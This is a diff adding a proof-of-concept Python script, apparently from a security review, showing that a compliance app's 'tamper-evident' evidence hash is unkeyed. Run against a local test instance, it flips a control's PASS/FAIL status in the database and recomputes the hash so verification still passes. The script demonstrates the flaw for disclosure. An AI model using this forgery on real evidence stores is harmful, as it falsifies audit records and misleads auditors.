+"""PROOF 3: evidence 'tamper-evidence' is an unkeyed hash — trivially forgeable."""
+import os, sys
+sys.path.insert(0, "/tmp/complens")
+for f in ("/tmp/p3.db",):
+    if os.path.exists(f): os.remove(f)
+os.environ.update({"APP_ENV":"test","ENABLE_SCHEDULER":"false",
+    "EVIDENCE_SIGNING_KEY":"a-very-secret-key-the-attacker-does-not-have",
+    "DATABASE_URL":"sqlite+pysqlite:////tmp/p3.db",
+    "EVIDENCE_LOCAL_PATH":"/tmp/p3_ev"})
+from fastapi.testclient import TestClient
+from app.main import app
+
+with TestClient(app) as c:
+    r = c.post("/assessments", json={"tenant_id":"acme","control_id":"AC-2-7","source_system":"DEMO"})
+    f = r.json()
+    print("assessment status    :", f["status"], "| finding:", f["finding_id"][:8])
+    print("integrity before     :", c.get("/evidence/verify?tenant_id=acme").json())
+
+    # --- the attacker has DB write access and wants a FAIL to read as PASS ---
+    from app.database import SessionLocal
+    from app.models import EvidenceMeta, ControlStatus
+    from app.evidence import record_hash      # <-- public, unkeyed, importable
+
+    db = SessionLocal()
+    e = db.query(EvidenceMeta).filter_by(tenant_id="acme").first()
+    original = e.status
+    e.status = ControlStatus.FAIL if original != ControlStatus.FAIL else ControlStatus.PASS
+    # Recompute the "tamper-evident" hash. No secret required.
+    e.record_hash = record_hash(evidence_id=e.evidence_id, tenant_id=e.tenant_id,
+                                run_id=e.run_id, control_id=e.control_id,
+                                framework=e.framework, status=e.status.value,
+                                telemetry_hash_value=e.telemetry_hash)
+    db.commit(); db.close()
+    print(f"tampered status      : {original.value} -> flipped, record_hash recomputed")
+    print()
+    print(">>> integrity after  :", c.get("/evidence/verify?tenant_id=acme").json())
+    print(">>> per-record verify:", c.get(f"/evidence/{e.evidence_id}/verify?tenant_id=acme").json())
